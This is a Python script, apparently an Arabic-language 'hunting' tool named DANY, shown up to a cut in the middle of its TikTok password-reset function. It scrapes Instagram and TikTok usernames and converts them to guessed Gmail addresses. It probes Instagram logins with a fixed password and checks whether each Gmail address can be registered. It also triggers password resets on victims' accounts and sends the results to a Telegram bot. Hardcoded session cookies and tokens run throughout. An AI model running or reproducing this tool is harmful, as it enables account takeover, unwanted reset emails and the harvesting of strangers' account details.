#مشكول الذمه الي ياخذ شي من الملف او يبيعه
#برمجتي من الصفر
#DEV => @X_6_Z
#Program => DANY
try:
    import requests
    import os
    import time
    import random
    import uuid
    from uuid import uuid4
    from user_agent import generate_user_agent
    import datetime
    import json
    import sys
    from oreoTO import InfoTik
    import socket
except:
    print('<<=Download library=>>')
    os.system('pip install rquests')
    os.system('pip install uuid')
    os.system('pip install user_agent')
    os.system('pip install json')
    os.system('pip install oreoTO')
    os.system('pip install socket')
    print('<<=Done downloading library=>>')
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
now = datetime.datetime.today()
mm = str(now.month)
dd = str(now.day)
yyyy = str(now.year)
hour = str(now.hour)
mi = str(now.minute)
ss = str(now.second)

t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)


hours = (now.hour)
x = datetime.datetime.now()
time1 = datetime.datetime.now()
g= datetime.datetime(2023, 9, 15, 0, 00 ,0)

if (x.strftime("%x"))>(g.strftime("%x")):
 print('\n\n')
 print(""+'Your subscription is not active @X_6_Z </> @H_9_D')
 print('\n\n')
 print(x)
 
 sys.exit(0)
 

if (x.strftime("%x"))==(g.strftime("%x")):
   print('')
   if(x.strftime("%X"))>(g.strftime("%X")):
    print('\n\n')
    print(""+'Your subscription is not active @X_6_Z </> @H_9_D' )
    print('\n\n')
    print(x)
    
    sys.exit(0)
   else:
    print('')  
else:
    print('')
print('')
###########الالوان###########
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
C = "\033[1;97m" #ابيض
y = '\033[1;35m'#وردي
f = '\033[2;35m'#بنفسجي
z = '\033[3;33m'#اصفر طوخ
G = '\033[2;36m'
E = '\033[1;31m'
V = '\033[1;35m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
S = '\033[1;33m'
U = '\x1b[1;37m'#ابیض
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
R = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
O = '\x1b[38;5;208m' #برتقالي
BL = '\x1b[38;5;21m' #ازاق طوخ
YU = '\x1b[38;5;200m' #وردي طوخ
###########الالوان###########
X_6_Z = str(uuid4())
z=0
x=0
c=0
v=0
b=0
n=0
m=0
w=0
e=0
r=0
t=0
nm=0
gooda=0
bada =0
good2 =0
bad2=0

def get_serch():
    sid = input(f'{BL}[+] Enter Your Session => ')
    while True:
        num = int("".join(random.choice('456789')for i in range(1)))
        users = str("".join(random.choice('qwertyuiopasdfghjklzxcvbnm123456789')for i in range(num)))
        url1 = f'https://www.instagram.com/api/v1/web/search/topsearch/?context=blended&include_reel=true&query={users}&rank_token=0.4675778310463927&search_surface=web_top_search'
        head1 = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cookie': f'mid=ZIwIGQALAAFJh0hs0zugnqEWswdV; ig_did=86209C21-70C2-4E14-B4F6-91D07CD08186; ig_nrcb=1; datr=EQiMZDSU8kuwtKAAlo7Zzc7X; shbid="15700\054512860282\0541723324593:01f73689efc90287a1755043118f103cf00011520f30b332cb9c6cb7e22bd65c2e9be9be"; shbts="1691788593\054512860282\0541723324593:01f70eed28db3817556817179468c4136331bc052166b0641d804a1715c83ed06ea3e5ef"; ds_user_id=61045883540; csrftoken=d9B3cjoZEBKnkJsZCKvWwDyzpB6hTo8A; sessionid={sid}; rur="CLN\05461045883540\0541723487339:01f741620fb5a3a54291c7bb1141d0d0a809c73842c6958401e41d42b2037478a377fd8f"',
            'Referer': 'https://www.instagram.com/h8pl/',
            'Sec-Ch-Prefers-Color-Scheme': 'light',
            'Sec-Ch-Ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
            'Sec-Ch-Ua-Full-Version-List': '"Not/A)Brand";v="99.0.0.0", "Google Chrome";v="115.0.5790.171", "Chromium";v="115.0.5790.171"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Ch-Ua-Platform-Version': '"10.0.0"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': str(generate_user_agent()),
            'Viewport-Width': '718',
            'X-Asbd-Id': '129477',
            'X-Csrftoken': 'sns7EiuaWlHURPEND7QuCiIl03EQsEzt',
            'X-Ig-App-Id': '936619743392459',
            'X-Ig-Www-Claim': 'hmac.AR21S63iRFxRSOmp5YPI60xla6XmM-5WuizCn7iaRP2o60FM',
            'X-Requested-With': 'XMLHttpRequest',
        }
        res1 = requests.get(url1, headers=head1).json()
        q=0
        sr=0
        try:
            while True:
                q+=1
                sr+=1
                usern = str(res1['users'][q]['user']['username'])
                emai=usern
                email=emai+'@gmail.com'
                if '_' in str(email):
                    continue
                print(f'{O}{sr}</> LIST <=>{email}')
                with open('DANY_TOOLS.txt', 'a') as f:
                    f.write(f'{email}\n')
        except:
            ''
def Check():
    global w,t,e,r
    id=input(f"{F} id ➯ {C}")
    token=input(f"{F} token ➯ {C}")
    requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=مرحباً بك في اداة DANY المجانيه </>✅\nجار بدأ الصيد يرجى الانتظار </>⚜️')
    fil = open('DANY_TOOLS.txt', 'r').read().splitlines()
    for email in fil:
        url = 'https://i.instagram.com/api/v1/accounts/login/'
        headers = {
            'Content-Length': '288' ,
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8 ',
            'Host': 'i.instagram.com ',
            'Connection': 'Keep-Alive ',
            'User-Agent': 'Instagram 113.0.0.39.122 Android (29/10; 480dpi; 1080x2196; INFINIX MOBILITY LIMITED/Infinix; Infinix X687B; Infinix-X687B; mt6785; ar_EG) ',
            'Accept-Language': 'en-US ',
            'X-IG-Connection-Type': 'WIFI', 
            'X-IG-Capabilities': 'AQ==', 
            'Accept-Encoding': 'gzip'}
        data = {
            'username' : email,
            'password' : 'DANY@))$',
            'device_id' : str(uuid4())}
        re = requests.post(url, headers=headers ,  data=data).text
        if ('"The password you entered is incorrect. Please try again."') in re:
            w+=1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f'''
{X}|{X}{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{F}×{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}
{Z}|{F}[+] GOOD USER <=> {w}
{F}|{Y}[+] BAD USER <=> {t}
{C}|{X}[+] GOOD GMAIL <=> {e}
{B}|{Z}[+] BAD GMAIL <=> {r}
{Y}|{X}{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{F}×{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}
{E}|{O}[+] DEV TOOLS <=> @X_6_Z
{Z}|{U}[+] channels program <=> @H_9_D
{X}|{X}{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{F}×{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}
''')
            #print(f'{F} </> GOOD USER <=> {w}\n{Y} </> BAD USER <=> {t}\n{F} </> GOOD GMAIL <=> {e}\n{Z} </> BAD GMAIL <=> {r}\n<\> DEV_TOOLS <=> @X_6_Z\n{f}<<<===============>>>\n{O} </> Check Gmail <=> {email}')
            url3 = 'https://android.clients.google.com/setup/checkavail'
            head3 = {
                'Content-Length':'98',
                'Content-Type':'text/plain; charset=UTF-8',
                'Host':'android.clients.google.com',
                'Connection':'Keep-Alive',
                'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',}
            data3 = json.dumps({
                'username':email,
                'version':'3',
                'firstName':'DANY',
                'lastName':'Ali',
                })
            res = requests.post(url3, headers=head3,  data=data3)
            if res.json()['status'] == 'SUCCESS':
                e+=1
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f'''
{X}|{X}{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{F}×{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}
{Z}|{F}[+] GOOD USER <=> {w}
{F}|{Y}[+] BAD USER <=> {t}
{C}|{X}[+] GOOD GMAIL <=> {e}
{B}|{Z}[+] BAD GMAIL <=> {r}
{Y}|{X}{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{F}×{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}
{E}|{O}[+] DEV TOOLS <=> @X_6_Z
{Z}|{U}[+] channels program <=> @H_9_D
{X}|{X}{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{F}×{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}
''')
                username = email.split('@gmail.com')[0]
                url = f'https://www.instagram.com/api/v1/users/web_profile_info/?username={username}'
                headers={
                            'Accept': '*/*',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Accept-Language': 'en-US,en;q=0.9',
                            'Cookie': 'mid=ZIwIGQALAAFJh0hs0zugnqEWswdV; ig_did=86209C21-70C2-4E14-B4F6-91D07CD08186; ig_nrcb=1; datr=EQiMZDSU8kuwtKAAlo7Zzc7X; csrftoken=pLp2gUePTIfW9rsOuZJ5MF8770n1wIsm; ds_user_id=61045883540; sessionid=61045883540%3AoEqkwb7LpfMtSt%3A4%3AAYd8N0mHCuOty8vN82iETN3eeb50DxxpJk3IelAvsA; rur="CLN\05461045883540\0541723015965:01f79335abb44457e7a9231a0397c3e8204618ea7c452c7c0a74b3d76b031eccfb8ef94a"',
                            'Referer': 'https://www.instagram.com/h8pl/',
                            'Sec-Ch-Prefers-Color-Scheme': 'light',
                            'Sec-Ch-Ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
                            'Sec-Ch-Ua-Full-Version-List': '"Not/A)Brand";v="99.0.0.0", "Google Chrome";v="115.0.5790.171", "Chromium";v="115.0.5790.171"',
                            'Sec-Ch-Ua-Mobile': '?0',
                            'Sec-Ch-Ua-Platform': '"Windows"',
                            'Sec-Ch-Ua-Platform-Version': '"10.0.0"',
                            'Sec-Fetch-Dest': 'empty',
                            'Sec-Fetch-Mode': 'cors',
                            'Sec-Fetch-Site': 'same-origin',
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                            'Viewport-Width': '779',
                            'X-Asbd-Id': '129477',
                            'X-Csrftoken': 'pLp2gUePTIfW9rsOuZJ5MF8770n1wIsm',
                            'X-Ig-App-Id': '936619743392459',
                            'X-Ig-Www-Claim': 'hmac.AR21S63iRFxRSOmp5YPI60xla6XmM-5WuizCn7iaRP2o68xb',
                            'X-Requested-With': 'XMLHttpRequest',}
                re = requests.get(url, headers=headers).json()
                name1 = re['data']['user']['full_name']
                user1 = re['data']['user']['username']
                id1 = re['data']['user']['id']
                follower1 = re['data']['user']['edge_followed_by']['count']
                following1 = re['data']['user']['edge_follow']['count']
                post1 = re['data']['user']['edge_owner_to_timeline_media']['count']
                pri = re['data']['user']['is_private']
                bio1 = re['data']['user']['biography']
                re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id1}")   
                ree = re.json()
                dat = ree['date']
                url = 'https://i.instagram.com/api/v1/accounts/send_password_reset/'
                he = {
'User-Agent': 'Instagram 113.0.0.39.122 Android (30/11; 480dpi; 1080x2004; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_EG_#u-nu-arab)',
'Cookie': 'mid=YwsgcAABAAGsRwCKCbYCaUO5xej3; csrftoken=u6c8M4zaneeZBfR5scLVY43lYSIoUhxL',
'Cookie2': '$Version=1',
'Accept-Language': 'ar-EG, en-US',
'X-IG-Connection-Type': 'MOBILE(LTE)',
'X-IG-Capabilities': 'AQ==',
'Accept-Encoding': 'gzip',
}
                data = {
"user_id":id1,"device_id":X_6_Z,
}
                DANY = requests.post(url,headers=he,  data=data).json()
                rest = DANY["obfuscated_email"]
                f1 = (f"""
⋘─────━𓆩DANY𓆪‏━─────⋙ 
✯ - 𝖓𝖆𝖒𝖊 : {name1}
✯ - 𝖚𝖘𝖊𝖗𝖓𝖆𝖒𝖊 : {username}
✯ - 𝖊𝖒𝖆𝖎𝖑 : {username}@gmail.com
✯ - 𝖋𝖔𝖑𝖑𝖔𝖜𝖊𝖗𝖘 : {follower1}
✯ - 𝖋𝖔𝖑𝖑𝖔𝖎𝖓𝖌 : {following1}
✯ - 𝖕𝖔𝖘𝖙𝖘 : {post1}
✯ - 𝖉𝖆𝖙𝖆 𝖆𝖈𝖈𝖔𝖚𝖓𝖙 : {dat}
✯ - 𝖗𝖊𝖘𝖙 : {rest}
✯ - 𝖑𝖎𝖓𝖐 » https://www.instagram.com/{username}
⋘─────━𓆩DANY𓆪‏━─────⋙ 
✯ - ᗷY : @X_6_Z , @H_9_D""")
                print(f'- Hit [{e}] Done Send Info Hit In Your Tele Bot.')
                requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={f1}')
                requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={email}')

            else:
                r+=1
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f'''
{X}|{X}{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{F}×{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}
{Z}|{F}[+] GOOD USER <=> {w}
{F}|{Y}[+] BAD USER <=> {t}
{C}|{X}[+] GOOD GMAIL <=> {e}
{B}|{Z}[+] BAD GMAIL <=> {r}
{Y}|{X}{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{F}×{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}
{E}|{O}[+] DEV TOOLS <=> @X_6_Z
{Z}|{U}[+] channels program <=> @H_9_D
{X}|{X}{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{F}×{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}
''')
            
        else:
            t+=1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f'''
{X}|{X}{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{F}×{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}
{Z}|{F}[+] GOOD USER <=> {w}
{F}|{Y}[+] BAD USER <=> {t}
{C}|{X}[+] GOOD GMAIL <=> {e}
{B}|{Z}[+] BAD GMAIL <=> {r}
{Y}|{X}{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{F}×{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}
{E}|{O}[+] DEV TOOLS <=> @X_6_Z
{Z}|{U}[+] channels program <=> @H_9_D
{X}|{X}{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{F}×{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}
''')
def Get_session():
    user = input(f"{C}[+] Enter your username => ")
    passe = input(f"{B}[+] Enter your password => ")
    print('\n')
    url3 = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
    head3 = {
        'Accept':'*/*',
        'Accept-Encoding':'gzip, deflate, br',
        'Accept-Language':'en-US,en;q=0.9',
        'Cookie':'mid=ZIwIGQALAAFJh0hs0zugnqEWswdV; ig_did=86209C21-70C2-4E14-B4F6-91D07CD08186; ig_nrcb=1; datr=EQiMZDSU8kuwtKAAlo7Zzc7X; shbid="13388\054520100803\0541718434971:01f708aaf5f4d0b8e06c87ac6d01cb13dc24d3bd6bf373c97cfa4a130ee8d0a0607a1f86"; shbts="1686898971\054520100803\0541718434971:01f7d4a446a2a860af42b6e7cee974af7a8468de8d27beb2541a9191cda510596756ea83"; csrftoken=E4LT33tvpnReMhASyO3qEvWlfQHvKtQr; ds_user_id=60519928037; rur="RVA\05460519928037\0541718911565:01f7b99028e1be254a339c69fb53a49d415102a704a59c8c730261e4285f325226779ae1"',
        'Referer':'https://www.instagram.com/h8pl/',
        'Sec-Ch-Prefers-Color-Scheme':'dark',
        'Sec-Ch-Ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
        'Sec-Ch-Ua-Full-Version-List':'"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.134", "Google Chrome";v="114.0.5735.134"',
        'Sec-Ch-Ua-Mobile':'?0',
        'Sec-Ch-Ua-Platform':'"Windows"',
        'Sec-Ch-Ua-Platform-Version':'"10.0.0"',
        'Sec-Fetch-Dest':'empty',
        'Sec-Fetch-Mode':'cors',
        'Sec-Fetch-Site':'same-origin',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'Viewport-Width':'857',
        'X-Asbd-Id':'129477',
        'X-Csrftoken':'E4LT33tvpnReMhASyO3qEvWlfQHvKtQr',
        'X-Ig-App-Id':'936619743392459',
        'X-Ig-Www-Claim':'hmac.AR1T6y1dtIYYcWgiHhZdAdPwm5pAyKYrpEfEe1RQmW67Mztd',
        'X-Requested-With':'XMLHttpReque',
    }
    tim = str(time.time()).split('.')[0]
    data3 = {
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:{passe}',
        'optIntoOneTap': 'false',
        'queryParams': '{}',
        'trustedDeviceRecords': '{}',
        'username': user,
    }
    ress = requests.post(url3, headers=head3, data=data3)
    if ('"user":true,') and ('"authenticated":true,') in ress.text:
        print('\n')
        print(f'{F}</>Good Login <=> {user}:{passe}')
        print('\n')
        ge = ress.cookies.get_dict()
        sess = (ge['sessionid'])
        print('\n')
        print(f'{F}</> Session ID <=> {sess}')
        print('\n')
    else:
        print('\n')
        print(f'{Z}</>Bad Login <=> {user}:{passe}')
        print('\n')
def rest_insta():
    print('\n')
    w = input(f'{YU}[+] Username => ')
    print('\n')
    url=f'https://i.instagram.com/api/v1/users/web_profile_info/?username={w}'
    head={'user-agent':'Mozilla/5.0 (Linux; Android 11; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'viewport-width':'412',
    'x-asbd-id':'198387',
    'x-ig-app-id':'1217981644879628',
    'x-ig-www-claim':'hmac.AR1GMxGxYNiyJ_Qr59WPgznfqJKtnAogUcpBr_5hDMSoxwjz'}
    req=requests.get(url,headers=head).json()
    id=req['data']['user']['id']
    head= {
        "accept": "*/*",
        "accept-language": "ar-AE,ar-IQ;q=0.9,ar;q=0.8,en-US;q=0.7,en;q=0.6",
        "sec-ch-prefers-color-scheme": "light",
        "sec-ch-ua": "\"Not:A-Brand\";v=\"99\", \"Chromium\";v=\"112\"",
        "sec-ch-ua-full-version-list": "\"Not:A-Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"112.0.5615.137\"",
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": "\"Android\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "viewport-width": "412",
        "x-asbd-id": "198387",
        "x-csrftoken": "nVW5MosXQoEr1Rv1Nc4qraggjTdU5pss",
        "x-ig-app-id": "1217981644879628",
        "x-ig-www-claim": "hmac.AR2QM86Qe5fITwAGguadrM-4LVWQ1OQc5RTpaUp_PHZQAkfb",
        "x-requested-with": "XMLHttpRequest"
        }
    data = {
            'ig_sig_key_version': '4',
            "user_id":f'{id}'
        }
    r = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=head, data=data).json()
    o=r['obfuscated_email']
    gg = f'''
{O}-------------

{YU}REST E-mail => {o}

{O}-------------

'''
    print(gg)
def delet_file():
    try:
        os.remove('DANY_TOOLS.txt')
        print('Done Deleting Files...')
    except:
        print('Not File phone...')
def Search_tiktok():
    while True:
        user = 'qwertyuiopasdfgh.jklzxcvbnm9876543'
        num ='456789'
        rng=int("".join(random.choice(num)for i in range(1)))
        usero=str("".join(random.choice(user)for i in range(rng)))
        url = f'https://livecounts.xyz/api/tiktok-live-follower-count/search/{usero}'
        hu=0
        rr = requests.get(url).json()
        try:
            while True:
                hu+= 1
                usern=str(rr['results'][hu]['username'])
                emai=usern
                email=emai+'@gmail.com'
                if '_' in str(email):
                    continue
                print(email)
                with open('TikTok.List.txt','a') as hh:
                    hh.write(f'{email}\n')
        except:
            ''
def get_listfolowing1move():
    ii=[]
    try:
        nm = int(input('Enter Number USERNAME => '))
    except:
        print('Erorr Number')
        exit()
    if nm<1:
        print('Erorr')
        exit()
    for un in range(nm):
        us = input(f'Enter USERNAME - [{un}] ')
        ii.append(us)
    for use in ii:
        user=str(use)
        O = InfoTik(user)
        id = O['id']
        url = f'https://api2-19-h2.musical.ly/aweme/v1/user/following/list/?user_id={id}&max_time=0&count=200&offset=0&source_type=2&address_book_access=2&gps_access=2&manifest_version_code=2019081160&_rticket=1693332251603&app_language=ar&app_type=normal&iid=7272462311494600454&channel=googleplay&device_type=Infinix%20X687B&language=ar&locale=ar&resolution=1080*2196&openudid=0f0f06ddfee22c5f&update_version_code=2019081160&sys_region=EG&os_api=29&uoo=0&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=480&carrier_region=IQ&ac=wifi&device_id=7236078733803144709&pass-route=1&mcc_mnc=41805&os_version=10&timezone_offset=10800&version_code=120603&carrier_region_v2=418&app_name=musical_ly&ab_version=12.6.3&version_name=12.6.3&device_brand=Infinix&ssmix=a&pass-region=1&device_platform=android&build_number=12.6.3&region=EG&aid=1233&ts=1693332247&sec_user_id={user}'
        head = {
                        'Host': 'api2-19-h2.musical.ly ', 
                        'Connection': 'keep-alive ', 
                        'Cookie': 'd_ticket=958499278f270c3ab7550b337ba43b702bc10; odin_tt=32a4cd04e1e8a7eb1787b20fce092d56a36769d156251749b40ae3e8910fe83a2a362615769c517d54b9b7032de23aed49a799d529b23f1a725b81afd1dec55abbead07a3cc03a4b267ff54bbe4c1730; sid_guard=13901f23dad1e26f1996c8c96d24641d%7C1693253662%7C15552000%7CSat%2C+24-Feb-2024+20%3A14%3A22+GMT; uid_tt=607af7b2d061947511346d55be9f428c089e94afedee5218749a4559fc58ea39; sid_tt=13901f23dad1e26f1996c8c96d24641d; sessionid=13901f23dad1e26f1996c8c96d24641d; store-idc=maliva; store-country-code=iq; store-country-code-src=uid; install_id=7272462311494600454; ttreq=1$803831cec4da3551b5afb80c3c9057e21de29407 ', 
                        'Accept-Encoding': 'gzip ', 
                        'X-Tt-Token': '0313901f23dad1e26f1996c8c96d24641d037bda2718a70b07301906b5d3528053c8e29c6c5ccab2da2653382dc7ae0cfe7fa1a7c8a306691e855228f3a5251b3025045eed41c99358530959ae929ad06b5bc7a31d84d106e60117e10af89e346d144-CkAyMzg4ZTMxZGE2OGJkYmEwOGMwNDgxOTgxMWI3NDQxMzdmMjBlYjZlMzFhODZlNWQxYmQ0ODU5NGU2YjA5MDZm-2.0.0 ', 
                        'sdk-version': '1 ', 
                        'x-tt-trace-id': '00-31611565da5ccdf39028a7399e544312-31611565da5ccdf3-01 ', 
                        'User-Agent': 'com.zhiliaoapp.musically/2019081160 (Linux; U; Android 10; ar_EG; Infinix X687B; Build/QP1A.190711.020; Cronet/58.0.2991.0) ', 
                        'X-Khronos': '1693332251 ', 
                        'X-Gorgon': '83000e560000d8275f71c369fbd5e7d5c480afa4349cbbca0c65'}
        res = requests.get(url, headers=head).json()
        try:
            q=0
            o=0
            while True:
                q+=1
                o+=1
                user = res['followings'][q]['unique_id']
                print(f'[{o}]<::>[{user}]')
                with open('TikTok.List.txt','a') as gg:
                    gg.write(f'{user}\n')
        except:
            pass
def get_listfolowing1():
    user = input('Enter USER :> ')
    O = InfoTik(user)
    id = O['id']
    url = f'https://api2-19-h2.musical.ly/aweme/v1/user/following/list/?user_id={id}&max_time=0&count=200&offset=0&source_type=2&address_book_access=2&gps_access=2&manifest_version_code=2019081160&_rticket=1693332251603&app_language=ar&app_type=normal&iid=7272462311494600454&channel=googleplay&device_type=Infinix%20X687B&language=ar&locale=ar&resolution=1080*2196&openudid=0f0f06ddfee22c5f&update_version_code=2019081160&sys_region=EG&os_api=29&uoo=0&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=480&carrier_region=IQ&ac=wifi&device_id=7236078733803144709&pass-route=1&mcc_mnc=41805&os_version=10&timezone_offset=10800&version_code=120603&carrier_region_v2=418&app_name=musical_ly&ab_version=12.6.3&version_name=12.6.3&device_brand=Infinix&ssmix=a&pass-region=1&device_platform=android&build_number=12.6.3&region=EG&aid=1233&ts=1693332247&sec_user_id={user}'
    head = {
        'Host': 'api2-19-h2.musical.ly ', 
        'Connection': 'keep-alive ', 
        'Cookie': 'd_ticket=958499278f270c3ab7550b337ba43b702bc10; odin_tt=32a4cd04e1e8a7eb1787b20fce092d56a36769d156251749b40ae3e8910fe83a2a362615769c517d54b9b7032de23aed49a799d529b23f1a725b81afd1dec55abbead07a3cc03a4b267ff54bbe4c1730; sid_guard=13901f23dad1e26f1996c8c96d24641d%7C1693253662%7C15552000%7CSat%2C+24-Feb-2024+20%3A14%3A22+GMT; uid_tt=607af7b2d061947511346d55be9f428c089e94afedee5218749a4559fc58ea39; sid_tt=13901f23dad1e26f1996c8c96d24641d; sessionid=13901f23dad1e26f1996c8c96d24641d; store-idc=maliva; store-country-code=iq; store-country-code-src=uid; install_id=7272462311494600454; ttreq=1$803831cec4da3551b5afb80c3c9057e21de29407 ', 
        'Accept-Encoding': 'gzip ', 
        'X-Tt-Token': '0313901f23dad1e26f1996c8c96d24641d037bda2718a70b07301906b5d3528053c8e29c6c5ccab2da2653382dc7ae0cfe7fa1a7c8a306691e855228f3a5251b3025045eed41c99358530959ae929ad06b5bc7a31d84d106e60117e10af89e346d144-CkAyMzg4ZTMxZGE2OGJkYmEwOGMwNDgxOTgxMWI3NDQxMzdmMjBlYjZlMzFhODZlNWQxYmQ0ODU5NGU2YjA5MDZm-2.0.0 ', 
        'sdk-version': '1 ', 
        'x-tt-trace-id': '00-31611565da5ccdf39028a7399e544312-31611565da5ccdf3-01 ', 
        'User-Agent': 'com.zhiliaoapp.musically/2019081160 (Linux; U; Android 10; ar_EG; Infinix X687B; Build/QP1A.190711.020; Cronet/58.0.2991.0) ', 
        'X-Khronos': '1693332251 ', 
        'X-Gorgon': '83000e560000d8275f71c369fbd5e7d5c480afa4349cbbca0c65'}
    res = requests.get(url, headers=head).json()
    try:
        q=0
        d=0
        while True:
            q+=1
            d+=1
            user = res['followings'][q]['unique_id']
            print(f'[{d}]<::>[{user}]')
            with open('TikTok.List.txt','a') as gg:
                gg.write(f'{user}\n')
    except:
        pass
def chesk_tiktok_list():
    global gooda,bada,good2,bad2
    id=input(f"{F} id ➯ {C}")
    token=input(f"{F} token ➯ {C}")
    requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=مرحباً بك في اداة DANY المجانيه </>✅\nجار بدأ الصيد يرجى الانتظار </>⚜️')
    fil = open('TikTok.List.txt','r').read().splitlines()
    RT = (len(fil))
    for email in fil:
        url = 'https://api2.musical.ly/aweme/v1/passport/find-password-via-email/?app_language=ar&manifest_version_code=2018062008&_rticket=1693756273106&iid=7274626820175136518&channel=googleplay&language=ar&fp=&device_type=Infinix+X692&resolution=720*1464&openudid=b32f27a32b0e1880&update_version_code=2018062008&sys_region=EG&os_api=29&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=320&carrier_region=IQ&ac=wifi&device_id=7149927891131893254&mcc_mnc=41805&timezone_offset=10800&os_version=10&version_code=750&app_name=musical_ly&version_name=7.5.0&device_brand=Infinix&ssmix=a&build_number=7.5.0&device_platform=android&region=SA&aid=1233&ts=1693756272&as=a1160a1f1087a42b644355&cp=ad7646660543f9b7e1Ysaa&mas=004d1f5c53007180ca36f95dd73a16869aacaccc2c2c6c464c2c86'
        head1 = {
            'Host': 'api2.musical.ly ', 
            'Connection': 'keep-alive ',
            'Content-Length': '606 ', 
